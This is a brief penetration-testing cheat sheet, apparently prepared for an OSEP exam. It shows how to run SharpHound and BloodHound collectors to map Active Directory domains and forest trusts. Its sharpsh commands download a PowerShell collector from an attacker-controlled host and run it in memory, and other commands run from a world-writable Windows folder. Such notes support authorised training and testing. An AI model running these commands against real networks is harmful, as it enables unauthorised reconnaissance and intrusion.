# SharpHound

#### WARNING: Using legacy sharphound/bloodhound is recommended for OSEP challenges/exam as the latest one can't fetch all edges - Do run both specially in exam

### 1) Go within the world writable directory for ease

    cd C:/Windows/tasks


### 2) Run with all checks and grab details of any trusts between forests

    execute-assembly -t 200 -- /home/kali/tools/bins/csharp-files/SharpHound-v2.5.13.exe -C all --searchforest


### 3) Specify a different forest/domain with which we have trust

    execute-assembly -t 200 -- /home/kali/tools/bins/csharp-files/SharpHound-v2.5.13.exe -d domain.com -C all --searchforest


### 4) Run old version of Sharphound if the latest one does not get many edges - Use GPOLocalGroup as All would not use it
    
    execute-assembly -t 200 -- /home/kali/tools/bins/csharp-files/SharpHound-v1.1.1.exe -C all --searchforest
    execute-assembly -t 200 -- /home/kali/tools/bins/csharp-files/SharpHound-v1.1.1.exe -C All,GPOLocalGroup --searchforest


### 5) PowerShell Legacy - https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.ps1

    sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/SharpHound.ps1 -c "Invoke-BloodHound -CollectionMethod All,GPOLocalGroup"'
    sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/SharpHound.ps1 -c "Invoke-BloodHound -CollectionMethod All,GPOLocalGroup -SearchForest"'

## Linux

CE

    bloodhound-ce-python -k -no-pass -c All -ns 10.10.100.15 -d domain.com -u machine05\$ --zip


Legacy

    bloodhound-python -k -no-pass -c All -ns 10.10.100.15 -d domain.com -u user --zip
